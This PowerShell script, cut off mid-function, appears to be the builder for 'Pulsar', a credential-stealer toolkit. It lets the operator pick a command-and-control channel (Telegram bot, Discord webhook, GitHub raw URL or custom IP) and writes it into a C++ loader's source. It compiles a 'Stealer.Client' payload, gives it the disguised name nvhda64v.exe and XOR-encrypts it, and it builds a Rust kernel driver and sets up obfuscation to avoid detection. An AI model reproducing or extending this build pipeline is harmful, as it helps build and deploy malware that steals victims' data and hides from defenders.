<#
.SYNOPSIS
    ⚡ PULSAR - Next-Generation Build System ⚡
    Enhanced Edition with Premium UI/UX - Crafted by ENI
    
.DESCRIPTION
    Professional-grade build orchestration with stunning visual interface,
    interactive controls, and real-time analytics for elite deployments.
#>

param(
    [switch]$SkipObfuscation,
    [switch]$Fast,
    [switch]$VerboseLog,
    [switch]$NoAnimation
)

# =============================================================================
# 🎨 GLOBAL CONFIGURATION
# =============================================================================
$ErrorActionPreference = "Continue"
$ProgressPreference = "SilentlyContinue"
$Script:BuildRoot = $PSScriptRoot
$Script:DistDir = Join-Path $BuildRoot "dist"
$Script:ShadowDir = Join-Path $BuildRoot "shadow-main"
$Script:PluginProj = Join-Path $BuildRoot "Pulsar.Plugin.Client\Stealer.Client\Stealer.Client.csproj"
$Script:ConfuserPath = Join-Path $BuildRoot "ConfuserEx-CLI\Confuser.CLI.exe"
$Script:LoaderSrc = Join-Path $BuildRoot "AbyssNative.cpp"
$Script:LoaderExe = "X O.exe"

# Build Analytics
$Script:BuildStats = @{
    StartTime = Get-Date
    Steps = @()
    Warnings = 0
    Errors = 0
    TotalFiles = 0
    TotalSize = 0
}

# Premium Color Palette
$Script:Theme = @{
    Primary = @{ FG = "Cyan"; BG = "Black" }
    Secondary = @{ FG = "Magenta"; BG = "Black" }
    Success = @{ FG = "Green"; BG = "Black" }
    Warning = @{ FG = "Yellow"; BG = "Black" }
    Error = @{ FG = "Red"; BG = "Black" }
    Info = @{ FG = "Blue"; BG = "Black" }
    Accent1 = @{ FG = "DarkCyan"; BG = "Black" }
    Accent2 = @{ FG = "DarkMagenta"; BG = "Black" }
    Muted = @{ FG = "DarkGray"; BG = "Black" }
    Highlight = @{ FG = "White"; BG = "Black" }
}

# =============================================================================
# 🎨 PREMIUM VISUAL ENGINE
# =============================================================================

function Write-RainbowText {
    param([string]$Text)
    
    $colors = @("Red", "Yellow", "Green", "Cyan", "Blue", "Magenta")
    $chars = $Text.ToCharArray()
    
    for ($i = 0; $i -lt $chars.Length; $i++) {
        $color = $colors[$i % $colors.Length]
        Write-Host $chars[$i] -ForegroundColor $color -NoNewline
    }
    Write-Host ""
}

function Write-GlowText {
    param(
        [string]$Text,
        [string]$GlowColor = "Cyan"
    )
    
    $glowColors = @{
        "Cyan" = @("DarkCyan", "Cyan", "White", "Cyan", "DarkCyan")
        "Magenta" = @("DarkMagenta", "Magenta", "White", "Magenta", "DarkMagenta")
        "Green" = @("DarkGreen", "Green", "White", "Green", "DarkGreen")
    }
    
    $sequence = $glowColors[$GlowColor]
    if (-not $sequence) { $sequence = $glowColors["Cyan"] }
    
    foreach ($color in $sequence) {
        Write-Host "`r$Text" -ForegroundColor $color -NoNewline
        Start-Sleep -Milliseconds 50
    }
    Write-Host ""
}

function Show-PulsarBanner {
    Clear-Host
    
    $banner = @"


    ██████╗ ██╗   ██╗██╗     ███████╗ █████╗ ██████╗ 
    ██╔══██╗██║   ██║██║     ██╔════╝██╔══██╗██╔══██╗
    ██████╔╝██║   ██║██║     ███████╗███████║██████╔╝
    ██╔═══╝ ██║   ██║██║     ╚════██║██╔══██║██╔══██╗
    ██║     ╚██████╔╝███████╗███████║██║  ██║██║  ██║
    ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝


"@
    
    if ($NoAnimation) {
        Write-Host $banner -ForegroundColor Cyan
    } else {
        $lines = $banner -split "`n"
        foreach ($line in $lines) {
            if ($line.Trim() -eq "") {
                Write-Host ""
                continue
            }
            
            # Rainbow effect for PULSAR text
            $chars = $line.ToCharArray()
            $colors = @("Cyan", "Blue", "Magenta", "Red", "Yellow", "Green")
            
            for ($i = 0; $i -lt $chars.Length; $i++) {
                $colorIndex = [math]::Floor(($i / $chars.Length) * $colors.Length)
                if ($chars[$i] -match '\S') {
                    Write-Host $chars[$i] -ForegroundColor $colors[$colorIndex] -NoNewline
                } else {
                    Write-Host $chars[$i] -NoNewline
                }
            }
            Write-Host ""
            Start-Sleep -Milliseconds 60
        }
    }
    
    # Subtitle with glow effect
    Write-Host ""
    $subtitle = "    ═══════════════════════════════════════════════════════════"
    Write-Host $subtitle -ForegroundColor DarkCyan
    
    Write-Host "      " -NoNewline
    Write-Host "⚡ " -NoNewline -ForegroundColor Yellow
    Write-Host "OBSIDIAN PRESTIGE BUILDER" -NoNewline -ForegroundColor White
    Write-Host " • " -NoNewline -ForegroundColor DarkGray
    Write-Host "v5.0 ULTRA" -ForegroundColor Cyan
    
    Write-Host "      " -NoNewline
    Write-Host "🔥 " -NoNewline -ForegroundColor Red
    Write-Host "Engineered by ENI" -NoNewline -ForegroundColor Gray
    Write-Host " • " -NoNewline -ForegroundColor DarkGray
    Write-Host "Next-Gen Build System" -ForegroundColor DarkCyan
    
    Write-Host $subtitle -ForegroundColor DarkCyan
    Write-Host ""
}

function Write-SectionHeader {
    param(
        [string]$Title,
        [string]$Icon = "▶",
        [string]$Color = "Cyan"
    )
    
    Write-Host ""
    Write-Host "  ╔═══════════════════════════════════════════════════════════════════╗" -ForegroundColor $Color
    Write-Host "  ║  " -NoNewline -ForegroundColor $Color
    Write-Host "$Icon " -NoNewline -ForegroundColor White
    Write-Host $Title.PadRight(63) -NoNewline -ForegroundColor White
    Write-Host "║" -ForegroundColor $Color
    Write-Host "  ╚═══════════════════════════════════════════════════════════════════╝" -ForegroundColor $Color
    Write-Host ""
}

function Write-StatusMessage {
    param(
        [string]$Message,
        [string]$Type = "Info",
        [string]$Icon = ""
    )
    
    $icons = @{
        "Info"     = "[i]"
        "Success"  = "[v]"
        "Warning"  = "[!]"
        "Error"    = "[x]"
        "Progress" = "[*]"
        "Complete" = "[#]"
        "Building" = "[B]"
        "Secure"   = "[S]"
        "Fire"     = "[F]"
        "Rocket"   = "[R]"
        "Star"     = "[*]"
        "Check"    = "v"
        "Cross"    = "x"
        "Arrow"    = "->"
    }
    
    $colors = @{
        "Info"     = "Cyan"
        "Success"  = "Green"
        "Warning"  = "Yellow"
        "Error"    = "Red"
        "Progress" = "Blue"
        "Complete" = "Magenta"
    }
    
    $displayIcon = if ($Icon) { $Icon } else { $icons[$Type] }
    $color = $colors[$Type]
    if (-not $color) { $color = "White" }
    
    Write-Host "    $displayIcon  " -NoNewline -ForegroundColor $color
    Write-Host $Message -ForegroundColor Gray
}

function Show-AnimatedProgress {
    param(
        [int]$Percent,
        [string]$Label = "",
        [int]$Width = 60,
        [string]$BarColor = "Cyan",
        [string]$Style = "Block"
    )
    
    $filled = [math]::Floor($Width * $Percent / 100)
    $empty = $Width - $filled
    
    # Different bar styles
    $styles = @{
        "Block"  = @{ Fill = "█"; Empty = "░"; Left = "["; Right = "]" }
        "Arrow"  = @{ Fill = "▶"; Empty = "▷"; Left = "«"; Right = "»" }
        "Dots"   = @{ Fill = "●"; Empty = "○"; Left = "("; Right = ")" }
        "Square" = @{ Fill = "■"; Empty = "□"; Left = "{"; Right = "}" }
    }
    
    $s = $styles[$Style]
    if (-not $s) { $s = $styles["Block"] }
    
    $bar = $s.Fill * $filled + $s.Empty * $empty
    
    # Color gradient based on percentage
    $percentColor = if ($Percent -lt 30) { "Red" } 
                    elseif ($Percent -lt 70) { "Yellow" } 
                    else { "Green" }
    
    Write-Host "`r  " -NoNewline
    Write-Host "$($s.Left)" -NoNewline -ForegroundColor DarkGray
    Write-Host $bar -NoNewline -ForegroundColor $BarColor
    Write-Host "$($s.Right) " -NoNewline -ForegroundColor DarkGray
    Write-Host "$Percent%" -NoNewline -ForegroundColor $percentColor
    Write-Host " │ " -NoNewline -ForegroundColor DarkGray
    Write-Host $Label -NoNewline -ForegroundColor Gray
    
    if ($Percent -ge 100) {
        Write-Host "  ✓" -ForegroundColor Green
    }
}

function Show-LoadingSpinner {
    param(
        [scriptblock]$Action,
        [string]$Message = "Processing",
        [string]$CompletedMessage = ""
    )
    
    $frames = @(
        "⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"
    )
    
    $colors = @("Cyan", "Blue", "Magenta", "Blue")
    
    $job = Start-Job -ScriptBlock $Action
    $i = 0
    
    while ($job.State -eq "Running") {
        $frame = $frames[$i % $frames.Length]
        $color = $colors[$i % $colors.Length]
        
        Write-Host "`r    $frame " -NoNewline -ForegroundColor $color
        Write-Host $Message -NoNewline -ForegroundColor Gray
        Write-Host "..." -NoNewline -ForegroundColor DarkGray
        
        Start-Sleep -Milliseconds 80
        $i++
    }
    
    $result = Receive-Job -Job $job
    Remove-Job -Job $job
    
    $finalMessage = if ($CompletedMessage) { $CompletedMessage } else { $Message }
    Write-Host "`r    ✅ $finalMessage - Done!                    " -ForegroundColor Green
    
    return $result
}

function Write-InfoBox {
    param(
        [string]$Title,
        [array]$Content,
        [string]$BoxColor = "Cyan",
        [string]$Icon = "📋"
    )
    
    $maxLength = ($Content | Measure-Object -Property Length -Maximum).Maximum
    if ($Title.Length -gt $maxLength) { $maxLength = $Title.Length }
    $width = [math]::Min($maxLength + 4, 70)
    
    # Top border
    Write-Host "  ┌─" -NoNewline -ForegroundColor $BoxColor
    Write-Host ("─" * ($width - 4)) -NoNewline -ForegroundColor $BoxColor
    Write-Host "─┐" -ForegroundColor $BoxColor
    
    # Title
    Write-Host "  │ " -NoNewline -ForegroundColor $BoxColor
    Write-Host "$Icon " -NoNewline -ForegroundColor White
    Write-Host $Title.PadRight($width - 6) -NoNewline -ForegroundColor White
    Write-Host " │" -ForegroundColor $BoxColor
    
    # Separator
    Write-Host "  ├─" -NoNewline -ForegroundColor $BoxColor
    Write-Host ("─" * ($width - 4)) -NoNewline -ForegroundColor $BoxColor
    Write-Host "─┤" -ForegroundColor $BoxColor
    
    # Content
    foreach ($line in $Content) {
        Write-Host "  │ " -NoNewline -ForegroundColor $BoxColor
        Write-Host $line.PadRight($width - 4) -NoNewline -ForegroundColor Gray
        Write-Host " │" -ForegroundColor $BoxColor
    }
    
    # Bottom border
    Write-Host "  └─" -NoNewline -ForegroundColor $BoxColor
    Write-Host ("─" * ($width - 4)) -NoNewline -ForegroundColor $BoxColor
    Write-Host "─┘" -ForegroundColor $BoxColor
}

# =============================================================================
# 🎮 INTERACTIVE MENU SYSTEM
# =============================================================================

function Show-ModernMenu {
    param(
        [string]$Title,
        [array]$Options,
        [string]$Description = "",
        [bool]$AllowSkip = $true,
        [string]$Icon = "🎯"
    )
    
    $selectedIndex = 0
    
    while ($true) {
        Clear-Host
        Show-PulsarBanner
        
        # Menu Header
        Write-Host "  ╔═══════════════════════════════════════════════════════════════════╗" -ForegroundColor Magenta
        Write-Host "  ║  " -NoNewline -ForegroundColor Magenta
        Write-Host "$Icon " -NoNewline -ForegroundColor White
        Write-Host $Title.PadRight(63) -NoNewline -ForegroundColor White
        Write-Host "║" -ForegroundColor Magenta
        
        if ($Description) {
            Write-Host "  ║  " -NoNewline -ForegroundColor Magenta
            Write-Host $Description.PadRight(65) -NoNewline -ForegroundColor DarkGray
            Write-Host "║" -ForegroundColor Magenta
        }
        
        Write-Host "  ╚═══════════════════════════════════════════════════════════════════╝" -ForegroundColor Magenta
        Write-Host ""
        
        # Options
        for ($i = 0; $i -lt $Options.Count; $i++) {
            if ($i -eq $selectedIndex) {
                # Selected option - highlighted
                Write-Host "      ▶ " -NoNewline -ForegroundColor Cyan
                Write-Host "┃" -NoNewline -ForegroundColor Magenta
                Write-Host " $($i + 1) " -NoNewline -ForegroundColor Yellow
                Write-Host "┃" -NoNewline -ForegroundColor Magenta
                Write-Host " $($Options[$i])" -ForegroundColor White
            } else {
                # Unselected option
                Write-Host "        " -NoNewline
                Write-Host "│" -NoNewline -ForegroundColor DarkGray
                Write-Host " $($i + 1) " -NoNewline -ForegroundColor DarkGray
                Write-Host "│" -NoNewline -ForegroundColor DarkGray
                Write-Host " $($Options[$i])" -ForegroundColor Gray
            }
        }
        
        if ($AllowSkip) {
            Write-Host ""
            Write-Host "        " -NoNewline
            Write-Host "│ 0 │" -NoNewline -ForegroundColor DarkGray
            Write-Host " Skip / Continue" -ForegroundColor DarkGray
        }
        
        Write-Host ""
        Write-Host "  ─────────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
        Write-Host ""
        Write-Host "    💡 " -NoNewline -ForegroundColor Yellow
        Write-Host "Navigation: " -NoNewline -ForegroundColor DarkGray
        Write-Host "↑ ↓" -NoNewline -ForegroundColor Cyan
        Write-Host " or " -NoNewline -ForegroundColor DarkGray
        Write-Host "1-$($Options.Count)" -NoNewline -ForegroundColor Cyan
        Write-Host "  │  " -NoNewline -ForegroundColor DarkGray
        Write-Host "Select: " -NoNewline -ForegroundColor DarkGray
        Write-Host "Enter" -NoNewline -ForegroundColor Green
        Write-Host "  │  " -NoNewline -ForegroundColor DarkGray
        if ($AllowSkip) {
            Write-Host "Skip: " -NoNewline -ForegroundColor DarkGray
            Write-Host "0" -ForegroundColor Yellow
        }
        Write-Host ""
        
        $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        
        switch ($key.VirtualKeyCode) {
            38 { # Up arrow
                $selectedIndex = ($selectedIndex - 1)
                if ($selectedIndex -lt 0) { $selectedIndex = $Options.Count - 1 }
            }
            40 { # Down arrow
                $selectedIndex = ($selectedIndex + 1) % $Options.Count
            }
            13 { # Enter
                return $selectedIndex + 1
            }
            48 { # 0
                if ($AllowSkip) { return 0 }
            }
            default {
                if ($key.Character -match "^[1-9]$") {
                    $num = [int]$key.Character
                    if ($num -le $Options.Count) { return $num }
                }
            }
        }
    }
}

function Get-StyledInput {
    param(
        [string]$Prompt,
        [string]$Pattern = ".*",
        [string]$ErrorMsg = "Invalid input format",
        [bool]$Required = $true,
        [string]$Example = ""
    )
    
    while ($true) {
        Write-Host ""
        Write-Host "    ┌─────────────────────────────────────────────────────────────┐" -ForegroundColor Cyan
        Write-Host "    │ " -NoNewline -ForegroundColor Cyan
        Write-Host $Prompt.PadRight(59) -NoNewline -ForegroundColor White
        Write-Host " │" -ForegroundColor Cyan
        
        if ($Example) {
            Write-Host "    │ " -NoNewline -ForegroundColor Cyan
            Write-Host "Example: " -NoNewline -ForegroundColor DarkGray
            Write-Host $Example.PadRight(50) -NoNewline -ForegroundColor Yellow
            Write-Host " │" -ForegroundColor Cyan
        }
        
        Write-Host "    └─────────────────────────────────────────────────────────────┘" -ForegroundColor Cyan
        Write-Host "    ❯ " -NoNewline -ForegroundColor Magenta
        
        $input = Read-Host
        
        if (-not $Required -and [string]::IsNullOrWhiteSpace($input)) {
            return ""
        }
        
        if ($input -match $Pattern) {
            Write-Host "    ✓ " -NoNewline -ForegroundColor Green
            Write-Host "Input validated successfully" -ForegroundColor DarkGray
            return $input
        }
        
        Write-Host "    ✗ " -NoNewline -ForegroundColor Red
        Write-Host $ErrorMsg -ForegroundColor Red
        Start-Sleep -Milliseconds 800
    }
}

# =============================================================================
# 🔧 CORE BUILD FUNCTIONS
# =============================================================================

function Initialize-BuildSystem {
    Write-SectionHeader -Title "INITIALIZING BUILD SYSTEM" -Icon "⚙️" -Color "Cyan"
    
    $tasks = @(
        @{ Name = "Validating environment"; Duration = 300 },
        @{ Name = "Loading configurations"; Duration = 250 },
        @{ Name = "Checking prerequisites"; Duration = 400 },
        @{ Name = "Preparing workspace"; Duration = 350 }
    )
    
    for ($i = 0; $i -lt $tasks.Count; $i++) {
        $task = $tasks[$i]
        $percent = [math]::Floor((($i + 1) / $tasks.Count) * 100)
        
        Show-AnimatedProgress -Percent $percent -Label $task.Name -BarColor "Cyan"
        Start-Sleep -Milliseconds $task.Duration
    }
    
    Write-Host ""
    Write-StatusMessage "Build system initialized successfully" "Success"
    Start-Sleep -Milliseconds 500
}

function Clean-BuildWorkspace {
    Write-SectionHeader -Title "WORKSPACE PREPARATION" -Icon "🧹" -Color "Blue"
    
    Write-StatusMessage "Analyzing workspace structure..." "Progress"
    Start-Sleep -Milliseconds 300
    
    try {
        if (Test-Path $Script:DistDir) {
            Write-StatusMessage "Removing old artifacts..." "Info"
            Remove-Item $Script:DistDir -Recurse -Force -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 200
        }
        
        Write-StatusMessage "Creating fresh output directory..." "Progress"
        New-Item -Path $Script:DistDir -ItemType Directory -Force | Out-Null
        
        Show-AnimatedProgress -Percent 100 -Label "Workspace cleansed" -BarColor "Green"
        
        Write-Host ""
        Write-StatusMessage "Workspace is pristine and ready" "Success"
        
        $Script:BuildStats.Steps += @{
            Name = "Clean Workspace"
            Status = "Success"
            Duration = 0
        }
    }
    catch {
        Write-StatusMessage "Error during workspace cleanup: $_" "Error"
        $Script:BuildStats.Errors++
    }
    
    Start-Sleep -Milliseconds 500
}

function Configure-C2Protocol {
    $options = @(
        "🌐  GitHub Raw URL",
        "📱  Telegram Bot API",
        "💬  Discord Webhook",
        "🌍  Custom DNS/IP Address",
        "🔮  Dystopia Protocol"
    )
    
    $choice = Show-ModernMenu -Title "C2 PROTOCOL CONFIGURATION" `
        -Options $options `
        -Description "Select your command & control architecture" `
        -Icon "🔗"
    
    $c2 = @{ Type = "NONE"; Val1 = ""; Val2 = "" }
    
    if ($choice -eq 0) {
        Write-StatusMessage "C2 configuration skipped" "Warning"
        Start-Sleep -Milliseconds 800
        return $c2
    }
    
    Clear-Host
    Show-PulsarBanner
    Write-SectionHeader -Title "C2 CONFIGURATION DETAILS" -Icon "⚙️" -Color "Magenta"
    
    switch ($choice) {
        1 {
            $c2.Type = "GITHUB"
            $c2.Val1 = Get-StyledInput -Prompt "Enter GitHub Raw URL" `
                -Pattern "^https://raw\.githubusercontent\.com/.+" `
                -ErrorMsg "Invalid GitHub Raw URL (must start with https://raw.githubusercontent.com/)" `
                -Example "https://raw.githubusercontent.com/user/repo/main/config.txt"
            
            Write-StatusMessage "GitHub C2 protocol configured" "Success"
        }
        2 {
            $c2.Type = "TELEGRAM"
            $c2.Val1 = Get-StyledInput -Prompt "Enter Telegram Bot Token" `
                -Pattern "^\d+:[\w\-]+$" `
                -ErrorMsg "Invalid bot token format (must be NUMBERS:ALPHANUMERIC)" `
                -Example "123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
            
            $c2.Val2 = Get-StyledInput -Prompt "Enter Chat ID" `
                -Pattern "^-?\d+$" `
                -ErrorMsg "Invalid Chat ID (must be numeric)" `
                -Example "-1001234567890"
            
            Write-StatusMessage "Telegram C2 protocol configured" "Success"
        }
        3 {
            $c2.Type = "DISCORD"
            $c2.Val1 = Get-StyledInput -Prompt "Enter Discord Webhook URL" `
                -Pattern "^https://discord(app)?\.com/api/webhooks/.+" `
                -ErrorMsg "Invalid Discord webhook URL" `
                -Example "https://discord.com/api/webhooks/123456/abcdef"
            
            Write-StatusMessage "Discord C2 protocol configured" "Success"
        }
        4 {
            $c2.Type = "MANUAL"
            $c2.Val1 = Get-StyledInput -Prompt "Enter Target Address" `
                -Pattern "^[\w\.\-:]+$" `
                -ErrorMsg "Invalid address format" `
                -Example "example.com:8080 or 192.168.1.100:443"
            
            Write-StatusMessage "Manual C2 endpoint configured" "Success"
        }
        5 {
            $c2.Type = "DYSTOPIA"
            
            $dystopiaOpts = @("💬  Discord Mode", "📱  Telegram Mode")
            $dystopiaChoice = Show-ModernMenu -Title "DYSTOPIA PROTOCOL MODE" `
                -Options $dystopiaOpts `
                -AllowSkip $false `
                -Icon "🔮"
            
            Clear-Host
            Show-PulsarBanner
            Write-SectionHeader -Title "DYSTOPIA PROTOCOL SETUP" -Icon "🔮" -Color "Magenta"
            
            if ($dystopiaChoice -eq 2) {
                $c2.Val1 = Get-StyledInput -Prompt "Enter Bot Token"
                $c2.Val2 = Get-StyledInput -Prompt "Enter Chat ID"
            } else {
                $c2.Val1 = Get-StyledInput -Prompt "Enter Webhook URL"
            }
            
            Write-StatusMessage "Dystopia Protocol configured" "Success"
        }
    }
    
    Start-Sleep -Milliseconds 1000
    return $c2
}

function Build-DotNetPlugin {
    $startTime = Get-Date
    
    Write-SectionHeader -Title ".NET PLUGIN BUILD" -Icon "🔨" -Color "Green"
    
    $logOut = Join-Path $Script:DistDir "build_plugin_out.log"
    $logErr = Join-Path $Script:DistDir "build_plugin_err.log"
    $args = "publish `"$Script:PluginProj`" -c Release -o `"$Script:DistDir`" /p:PublishSingleFile=true /p:SelfContained=false /p:DebugType=None /p:DebugSymbols=false"
    
    Write-StatusMessage "Preparing MSBuild environment..." "Progress"
    Start-Sleep -Milliseconds 300
    
    # Pre-build simulation
    $prebuild = @("Analyzing dependencies", "Resolving packages", "Generating build graph")
    for ($i = 0; $i -lt $prebuild.Count; $i++) {
        $percent = [math]::Floor((($i + 1) / $prebuild.Count) * 30)
        Show-AnimatedProgress -Percent $percent -Label $prebuild[$i] -BarColor "Cyan"
        Start-Sleep -Milliseconds 400
    }
    
    Write-Host ""
    Write-StatusMessage "Compiling .NET assemblies..." "Building"
    
    $process = Start-Process "dotnet" -ArgumentList $args -NoNewWindow -PassThru `
        -RedirectStandardOutput $logOut -RedirectStandardError $logErr
    
    # Animated compilation
    $spinFrames = @("◐", "◓", "◑", "◒")
    $i = 0
    while (-not $process.HasExited) {
        $frame = $spinFrames[$i % $spinFrames.Length]
        Write-Host "`r    $frame " -NoNewline -ForegroundColor Cyan
        Write-Host "Building payload... " -NoNewline -ForegroundColor Gray
        
        $dots = "." * (($i % 3) + 1)
        Write-Host $dots.PadRight(3) -NoNewline -ForegroundColor DarkGray
        
        Start-Sleep -Milliseconds 100
        $i++
    }
    
    Write-Host "`r                                                          "
    
    if ($process.ExitCode -eq 0) {
        Show-AnimatedProgress -Percent 100 -Label "Compilation successful" -BarColor "Green"
        Write-Host ""
        Write-StatusMessage "Build artifact secured" "Success"
        
        $publishedExe = Join-Path $Script:DistDir "nvhda64v.exe"
        $publishedDll = Join-Path $Script:DistDir "nvhda64v.dll"
        $inner = Join-Path $Script:DistDir "nvhda64v_inner.exe"
        
        # Prepare for movement with NUCLEAR FORCE 💀
        if (Test-Path $publishedExe) {
            Write-StatusMessage "DEVASTATING existing instances..." "Warning"
            
            # Annie's Ruthless Execution Ritual 💋
            $targets = @("nvhda64v_inner", "nvhda64v", "X O")
            foreach ($t in $targets) {
                Stop-Process -Name $t -Force -ErrorAction SilentlyContinue
                cmd /c "taskkill /F /IM `"$t.exe`" /T 2>nul" | Out-Null
            }

            # Đảm bảo file đích phải "bay màu" hoàn toàn 💋
            $maxWait = 20
            $waited = 0
            while ((Test-Path $inner) -and ($waited -lt $maxWait)) {
                Write-StatusMessage "Exorcising $inner (Attempt $($waited + 1))..." "Warning"
                $null = Remove-Item $inner -Force -ErrorAction SilentlyContinue
                cmd /c "del /F /Q `"$inner`" 2>nul" | Out-Null
                Start-Sleep -Milliseconds 200
                $waited++
            }

            if (Test-Path $inner) {
                Write-StatusMessage "FATAL: Could not banish $inner. System is resisting! 😡" "Error"
                exit 1
            }

            Write-StatusMessage "Path cleared. Moving payload into the Void..." "Progress"
            Move-Item $publishedExe $inner -Force -ErrorAction Stop
        }

        # Annie's XOR Encryption Ritual with Locking Protection 💋
        function Invoke-XorEncryption {
            param([string]$Path, [byte]$Key = 0xAB)
            if (-not (Test-Path $Path)) { return }
            
            Write-StatusMessage "Encrypting $(Split-Path $Path -Leaf)..." "Secure"
            
            $maxRetries = 10
            $retryCount = 0
            $success = $false
            
            while (-not $success -and $retryCount -lt $maxRetries) {
                try {
                    $bytes = [System.IO.File]::ReadAllBytes($Path)
                    # XOR logic
                    for($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $Key }
                    [System.IO.File]::WriteAllBytes($Path, $bytes)
                    $success = $true
                }
                catch {
                    $retryCount++
                    Write-StatusMessage "File locked, retrying ($retryCount/$maxRetries)..." "Warning"
                    Start-Sleep -Milliseconds 500
                }
            }
            
            if (-not $success) {
                Write-StatusMessage "Failed to encrypt $Path after $maxRetries attempts." "Error"
                exit 1
            }
        }

        if (Test-Path $inner) { Invoke-XorEncryption -Path $inner }
        $driverPath = Join-Path $Script:DistDir "shadow_core.sys"
        if (Test-Path $driverPath) { Invoke-XorEncryption -Path $driverPath }

        $duration = (Get-Date) - $startTime
        $Script:BuildStats.Steps += @{
            Name = ".NET Plugin Build"
            Status = "Success"
            Duration = $duration.TotalSeconds
        }
    }
    else {
        Write-StatusMessage "Compilation failed" "Error"
        Write-InfoBox -Title "Build Error Log" `
            -Content (Get-Content $logErr -Tail 10) `
            -BoxColor "Red" `
            -Icon "x"
        
        $Script:BuildStats.Errors++
        exit 1
    }
    
    Start-Sleep -Milliseconds 500
}

function Build-RustKernelDriver {
    $startTime = Get-Date
    
    Write-SectionHeader -Title "RUST KERNEL DRIVER" -Icon "⚙️" -Color "Yellow"
    
    if (-not (Get-Command "rustc" -ErrorAction SilentlyContinue)) {
        Write-StatusMessage "Rust toolchain not detected" "Warning"
        Write-StatusMessage "Driver build skipped - install Rust to enable" "Info"
        $Script:BuildStats.Warnings++
        Start-Sleep -Milliseconds 1000
        return
    }
    
    Write-StatusMessage "Rust compiler detected" "Success"
    
    $driverSrcDir = $Script:ShadowDir
    $driverTargetDll = Join-Path $driverSrcDir "target\x86_64-pc-windows-msvc\release\shadow_core.dll"
    $driverFallbackDll = Join-Path $driverSrcDir "target\release\shadow_core.dll"
    
    if (-not (Test-Path $driverTargetDll) -and -not (Test-Path $driverFallbackDll)) {
        Write-StatusMessage "Initiating Cargo build..." "Progress"
        
        Push-Location $driverSrcDir
        try {
            $cargoBuild = @("Fetching crates", "Compiling dependencies", "Building driver", "Optimizing binary")
            for ($i = 0; $i -lt $cargoBuild.Count; $i++) {
                $percent = [math]::Floor((($i + 1) / $cargoBuild.Count) * 100)
                Show-AnimatedProgress -Percent $percent -Label $cargoBuild[$i] -BarColor "Yellow" -Style "Arrow"
                Start-Sleep -Milliseconds 600
            }
            
            Write-Host ""
            $res = & cargo build --release --package shadow_core 2>&1 | Out-String
            
            if ($LASTEXITCODE -ne 0) {
                Write-StatusMessage "Driver compilation failed" "Error"
                Write-Host $res -ForegroundColor Red
                $Script:BuildStats.Errors++
                return
            }
            
            Write-StatusMessage "Driver built successfully" "Success"
        }
        catch {
            Write-StatusMessage "Build error: $_" "Error"
            $Script:BuildStats.Errors++
            return
        }
        finally {
            Pop-Location
        }
    }

    $finalDriver = if (Test-Path $driverTargetDll) { $driverTargetDll } else { $driverFallbackDll }

    if (Test-Path $finalDriver) {
        Copy-Item $finalDriver (Join-Path $Script:DistDir "shadow_core.sys") -Force
        Write-StatusMessage "Kernel driver signed and ready" "Success"
        
        $duration = (Get-Date) - $startTime
        $Script:BuildStats.Steps += @{
            Name = "Rust Kernel Driver"
            Status = "Success"
            Duration = $duration.TotalSeconds
        }
    }
    else {
        Write-StatusMessage "Driver artifact not found" "Error"
        $Script:BuildStats.Errors++
    }
    
    Start-Sleep -Milliseconds 500
}

function Build-NativeLoader {
    param($C2Config)
    
    $startTime = Get-Date
    
    Write-SectionHeader -Title "C++ NATIVE LOADER" -Icon "🚀" -Color "Magenta"
    
    # Inject C2 config
    if ($C2Config.Type -ne "NONE") {
        Write-StatusMessage "Embedding C2 configuration..." "Progress"
        
        $content = Get-Content $Script:LoaderSrc -Raw
        $content = $content -replace 'std::string C2_URL = ".*";', "std::string C2_URL = `"$($C2Config.Val1)`";"
        $content = $content -replace 'std::string C2_VAL2 = ".*";', "std::string C2_VAL2 = `"$($C2Config.Val2)`";"
        $content = $content -replace 'std::string C2_TYPE = ".*";', "std::string C2_TYPE = `"$($C2Config.Type)`";"
        Set-Content $Script:LoaderSrc $content
        
        Write-StatusMessage "C2 endpoints injected into source" "Success"
        Start-Sleep -Milliseconds 300
    }
    
    # Find MSVC
    Write-StatusMessage "Locating MSVC toolchain..." "Progress"
    
    $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
    if (-not (Test-Path $vswhere)) {
        $vswhere = "${env:ProgramFiles}\Microsoft Visual Studio\Installer\vswhere.exe"
    }

    if (Test-Path $vswhere) {
        $path = & $vswhere -latest -products * -property installationPath
        $vcVars = Join-Path $path "VC\Auxiliary\Build\vcvars64.bat"
        
        if (Test-Path $vcVars) {
            Write-StatusMessage "MSVC toolchain located" "Success"
            
            $msvcSteps = @("Preprocessing sources", "Compiling C++", "Linking binaries", "Code signing")
            for ($i = 0; $i -lt $msvcSteps.Count; $i++) {
                $percent = [math]::Floor((($i + 1) / $msvcSteps.Count) * 100)
                Show-AnimatedProgress -Percent $percent -Label $msvcSteps[$i] -BarColor "Magenta" -Style "Square"
                Start-Sleep -Milliseconds 500
            }
            
            Write-Host ""
            Write-StatusMessage "Invoking MSVC compiler..." "Building"
            
            $cmd = "`"$vcVars`" && call compile_abyss.bat"
            $output = cmd /c $cmd 2>&1
            
            if ($LASTEXITCODE -eq 0 -and (Test-Path (Join-Path $Script:BuildRoot $Script:LoaderExe))) {
                Move-Item (Join-Path $Script:BuildRoot $Script:LoaderExe) (Join-Path $Script:DistDir $Script:LoaderExe) -Force
                Write-StatusMessage "Native loader compiled successfully" "Success"
                
                $duration = (Get-Date) - $startTime
                $Script:BuildStats.Steps += @{
                    Name = "Native Loader"
                    Status = "Success"
                    Duration = $duration.TotalSeconds
                }
            }
            else {
                Write-StatusMessage "CRITICAL: Native Loader build failed!" "Error"
                $errorLog = Join-Path $Script:DistDir "compilation_report.log"
                
                # Tạo báo cáo lỗi chi tiết 💋
                $reportHeader = "╔════════════════════════════════════════════════════════════════════╗`n"
                $reportHeader += "║              🔥 MSVC DETAILED ERROR REPORT 🔥                      ║`n"
                $reportHeader += "╚════════════════════════════════════════════════════════════════════╝`n"
                
                $fullOutput = $reportHeader + ($output | Out-String)
                $fullOutput | Out-File -FilePath $errorLog -Encoding utf8
                
